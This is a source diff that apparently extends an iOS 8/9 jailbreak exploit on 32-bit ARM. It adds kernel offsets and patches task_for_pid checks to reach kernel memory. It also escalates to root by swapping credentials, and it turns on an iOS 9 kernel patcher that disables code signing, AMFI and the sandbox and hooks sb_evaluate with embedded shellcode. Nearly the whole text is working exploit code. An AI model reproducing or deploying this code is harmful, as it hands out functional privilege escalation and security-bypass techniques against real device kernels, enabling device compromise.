@@ -55,6 +55,9 @@ uint32_t write_gadget;
 
 uint32_t* offsets = NULL;
 
+uint32_t myproc=0;
+uint32_t mycred=0;
+
 uint32_t tte_virt;
 uint32_t tte_phys;
 uint32_t flush_dcache;
@@ -229,7 +232,7 @@ uint32_t koffsets_S5L8950X_13A452[] = {
     0xbf5ac,    // flush_dcache
     0xcb600,    // invalidate_tlb
     0x302bdc,   // task_for_pid
-    0x18,       // pid_check_addr offset
+    0x18+2,       // pid_check_addr offset
     0x40,       // posix_check_ret_addr offset
     0x224,      // mac_proc_check_ret_addr offset
     0x45d9b0,   // allproc
@@ -640,8 +643,8 @@ void do_exploit(uint32_t kernel_base){
     if(uid != 0){
         // elevation to root privilege by xerub
         uint32_t kproc = 0;
-        uint32_t myproc = 0;
-        uint32_t mycred = 0;
+        myproc = 0;
+        mycred = 0;
         pid_t mypid = getpid();
         pid_t myuid = getuid();
         uint32_t proc = read_primitive(kernel_base + koffset(offsetof_allproc));
@@ -667,24 +670,30 @@ void do_exploit(uint32_t kernel_base){
     uint32_t pid_check_addr = koffset(offsetof_pid_check) + task_for_pid_base;
     printf("[OF] pid_check_addr: %08x\n", pid_check_addr);
     
-    uint32_t pid_check_val = read_primitive(pid_check_addr);
-    pid_check_val |= 0xff;
-    
     patch_page_table(1, tte_virt, tte_phys, flush_dcache, invalidate_tlb, pid_check_addr & ~0xFFF);
-    write_primitive(pid_check_addr, pid_check_val); // cmp r6, #ff
+    
+    if(!isIOS9){
+        uint32_t pid_check_val = read_primitive(pid_check_addr);
+        pid_check_val |= 0xff;
+        write_primitive(pid_check_addr, pid_check_val); // cmp r6, #ff
+    } else {
+        write_primitive(pid_check_addr, 0xbf00bf00); // beq -> NOP
+    }
+    
+    usleep(100000);
     
     uint32_t posix_check_ret_addr;
     uint32_t posix_check_ret_val;
     uint32_t mac_proc_check_ret_addr;
     uint32_t mac_proc_check_ret_val;
     if(uid != 0){
-        uint32_t posix_check_ret_addr = koffset(offsetof_posix_check) + task_for_pid_base;
-        uint32_t posix_check_ret_val = read_primitive(posix_check_ret_addr);
+        posix_check_ret_addr = koffset(offsetof_posix_check) + task_for_pid_base;
+        posix_check_ret_val = read_primitive(posix_check_ret_addr);
         patch_page_table(1, tte_virt, tte_phys, flush_dcache, invalidate_tlb, posix_check_ret_addr & ~0xFFF);
         write_primitive(posix_check_ret_addr, posix_check_ret_val + 0xff); // cmp r0, #ff
         
-        uint32_t mac_proc_check_ret_addr = koffset(offsetof_mac_proc_check) + task_for_pid_base;
-        uint32_t mac_proc_check_ret_val = read_primitive(mac_proc_check_ret_addr);
+        mac_proc_check_ret_addr = koffset(offsetof_mac_proc_check) + task_for_pid_base;
+        mac_proc_check_ret_val = read_primitive(mac_proc_check_ret_addr);
         patch_page_table(1, tte_virt, tte_phys, flush_dcache, invalidate_tlb, mac_proc_check_ret_addr & ~0xFFF);
         write_primitive(mac_proc_check_ret_addr, mac_proc_check_ret_val | 0x10000); // cmp.w r8, #1
     }
@@ -700,6 +709,7 @@ void do_exploit(uint32_t kernel_base){
         write_primitive_dword_tfp0(posix_check_ret_addr, posix_check_ret_val);
         write_primitive_dword_tfp0(mac_proc_check_ret_addr, mac_proc_check_ret_val);
         exec_primitive(flush_dcache, 0, 0);
+        usleep(100000);
     }
     
 }
@@ -997,7 +1007,116 @@ void unjail9(uint32_t kbase){
     printf("[PF] csops:                      %08x\n", csops_addr);
     printf("[PF] amfi_file_check_mmap:       %08x\n", amfi_file_check_mmap);
     
-    //printf("[*] running kernelpatcher\n");
+    printf("[*] running kernelpatcher\n");
+    
+    /* proc_enforce: -> 0 */
+    write_primitive_dword_tfp0(proc_enforce, 0);
+    
+    /* cs_enforcement_disable = 1 && amfi_get_out_of_my_way = 1 */
+    write_primitive_byte_tfp0(cs_enforcement_disable_amfi, 1);
+    write_primitive_byte_tfp0(cs_enforcement_disable_amfi-1, 1);
+    
+    /* bootArgs */
+    patch_bootargs(p_bootargs);
+    
+    /* debug_enabled -> 1 */
+    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (PE_i_can_has_debugger_1 & ~0xFFF));
+    write_primitive_dword_tfp0(PE_i_can_has_debugger_1, 1);
+    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (PE_i_can_has_debugger_2 & ~0xFFF));
+    write_primitive_dword_tfp0(PE_i_can_has_debugger_2, 1);
+    
+    /* vm_fault_enter */
+    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (vm_fault_enter & ~0xFFF));
+    write_primitive_word_tfp0(vm_fault_enter, 0x2201);
+    
+    /* vm_map_enter */
+    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (vm_map_enter & ~0xFFF));
+    write_primitive_dword_tfp0(vm_map_enter, 0xbf00bf00);
+    
+    /* vm_map_protect: set NOP */
+    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (vm_map_protect & ~0xFFF));
+    write_primitive_dword_tfp0(vm_map_protect, 0xbf00bf00);
+    
+    /* mount patch */
+    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (mount_patch & ~0xFFF));
+    write_primitive_byte_tfp0(mount_patch, 0xe7);
+    
+    /* mapForIO: prevent kIOReturnLockedWrite error */
+    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (mapForIO & ~0xFFF));
+    write_primitive_dword_tfp0(mapForIO, 0xbf00bf00);
+    
+    /* csops */
+    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (csops_addr & ~0xFFF));
+    write_primitive_dword_tfp0(csops_addr, 0xbf00bf00);
+    
+    /* amfi_file_check_mmap */
+    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (amfi_file_check_mmap & ~0xFFF));
+    write_primitive_dword_tfp0(amfi_file_check_mmap, 0xbf00bf00);
+    
+    /* sandbox */
+    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (sandbox_call_i_can_has_debugger & ~0xFFF));
+    write_primitive_dword_tfp0(sandbox_call_i_can_has_debugger, 0xbf00bf00);
+    
+    /* sb_evaluate */
+    unsigned char pangu9_payload[] = {
+        0x1f, 0xb5, 0xad, 0xf5, 0x82, 0x6d, 0x1c, 0x6b, 0x01, 0x2c, 0x34, 0xd1,
+        0x5c, 0x6b, 0x00, 0x2c, 0x31, 0xd0, 0x69, 0x46, 0x5f, 0xf4, 0x80, 0x60,
+        0x0d, 0xf5, 0x80, 0x62, 0x10, 0x60, 0x20, 0x46, 0x11, 0x11, 0x11, 0x11,
+        0x1c, 0x28, 0x01, 0xd0, 0x00, 0x28, 0x24, 0xd1, 0x68, 0x46, 0x17, 0xa1,
+        0x10, 0x22, 0x22, 0x22, 0x22, 0x22, 0x00, 0x28, 0x1d, 0xd0, 0x68, 0x46,
+        0x0f, 0xf2, 0x5c, 0x01, 0x13, 0x22, 0x22, 0x22, 0x22, 0x22, 0x00, 0x28,
+        0x0d, 0xd1, 0x68, 0x46, 0x18, 0xa1, 0x31, 0x22, 0x22, 0x22, 0x22, 0x22,
+        0x00, 0x28, 0x0e, 0xd0, 0x68, 0x46, 0x22, 0xa1, 0x27, 0x22, 0x22, 0x22,
+        0x22, 0x22, 0x00, 0x28, 0x07, 0xd1, 0x0d, 0xf5, 0x82, 0x6d, 0x01, 0xbc,
+        0x00, 0x21, 0x01, 0x60, 0x18, 0x21, 0x01, 0x71, 0x1e, 0xbd, 0x0d, 0xf5,
+        0x82, 0x6d, 0x05, 0x98, 0x86, 0x46, 0x1f, 0xbc, 0x01, 0xb0, 0xcc, 0xcc,
+        0xcc, 0xcc, 0xdd, 0xdd, 0xdd, 0xdd, 0x00, 0xbf, 0x2f, 0x70, 0x72, 0x69,
+        0x76, 0x61, 0x74, 0x65, 0x2f, 0x76, 0x61, 0x72, 0x2f, 0x74, 0x6d, 0x70,
+        0x2f, 0x70, 0x72, 0x69, 0x76, 0x61, 0x74, 0x65, 0x2f, 0x76, 0x61, 0x72,
+        0x2f, 0x6d, 0x6f, 0x62, 0x69, 0x6c, 0x65, 0x00, 0x2f, 0x70, 0x72, 0x69,
+        0x76, 0x61, 0x74, 0x65, 0x2f, 0x76, 0x61, 0x72, 0x2f, 0x6d, 0x6f, 0x62,
+        0x69, 0x6c, 0x65, 0x2f, 0x4c, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x2f,
+        0x50, 0x72, 0x65, 0x66, 0x65, 0x72, 0x65, 0x6e, 0x63, 0x65, 0x73, 0x2f,
+        0x63, 0x6f, 0x6d, 0x2e, 0x61, 0x70, 0x70, 0x6c, 0x65, 0x00, 0x00, 0xbf,
+        0x2f, 0x70, 0x72, 0x69, 0x76, 0x61, 0x74, 0x65, 0x2f, 0x76, 0x61, 0x72,
+        0x2f, 0x6d, 0x6f, 0x62, 0x69, 0x6c, 0x65, 0x2f, 0x4c, 0x69, 0x62, 0x72,
+        0x61, 0x72, 0x79, 0x2f, 0x50, 0x72, 0x65, 0x66, 0x65, 0x72, 0x65, 0x6e,
+        0x63, 0x65, 0x73, 0x00, 0x02, 0x00, 0x00, 0x00
+    };
+    
+    uint32_t payload_base = 0xb00; // taig8
+    size_t payload_len = 0x110;
+    
+    uint32_t vn_getpath_bl = make_bl(payload_base+0x20, vn_getpath);
+    uint32_t memcmp_bl_1 = make_bl(payload_base+0x32, memcmp_addr);
+    uint32_t memcmp_bl_2 = make_bl(payload_base+0x42, memcmp_addr);
+    uint32_t memcmp_bl_3 = make_bl(payload_base+0x50, memcmp_addr);
+    uint32_t memcmp_bl_4 = make_bl(payload_base+0x5e, memcmp_addr);
+    uint32_t sb_evaluate_val = read_primitive_dword_tfp0(sb_patch);
+    uint32_t back_sb_evaluate = make_b_w(payload_base+0x86, (sb_patch+4-kbase));
+    
+    *(uint32_t*)(pangu9_payload+0x20) = vn_getpath_bl;
+    *(uint32_t*)(pangu9_payload+0x32) = memcmp_bl_1;
+    *(uint32_t*)(pangu9_payload+0x42) = memcmp_bl_2;
+    *(uint32_t*)(pangu9_payload+0x50) = memcmp_bl_3;
+    *(uint32_t*)(pangu9_payload+0x5e) = memcmp_bl_4;
+    *(uint32_t*)(pangu9_payload+0x82) = sb_evaluate_val;
+    *(uint32_t*)(pangu9_payload+0x86) = back_sb_evaluate;
+    
+    void* sandbox_payload = malloc(payload_len);
+    memcpy(sandbox_payload, pangu9_payload, payload_len);
+    
+    // hook sb_evaluate
+    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, ((kbase + payload_base) & ~0xFFF));
+    copyout((kbase + payload_base), sandbox_payload, payload_len);
+    
+    uint32_t sb_evaluate_hook = make_b_w((sb_patch-kbase), payload_base);
+    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (sb_patch & ~0xFFF));
+    write_primitive_dword_tfp0(sb_patch, sb_evaluate_hook);
+    
+    exec_primitive(flush_dcache, 0, 0);
+    
+    printf("enable patched.\n");
     
 }
 
@@ -1059,7 +1178,7 @@ int main(void){
         if(!isIOS9){
             unjail8(kernel_base);
         } else {
-            //unjail9(kernel_base); // TODO
+            unjail9(kernel_base);
         }
         load_jb();
         
@@ -1070,6 +1189,13 @@ int main(void){
     }
     
     printf("[*] DONE!\n");
+
+#ifndef UNTETHER
+    if(myproc){
+        write_primitive(myproc + koffset(offsetof_p_ucred), mycred);
+        setuid(501);
+    }
+#endif
     
     return 0;
 }
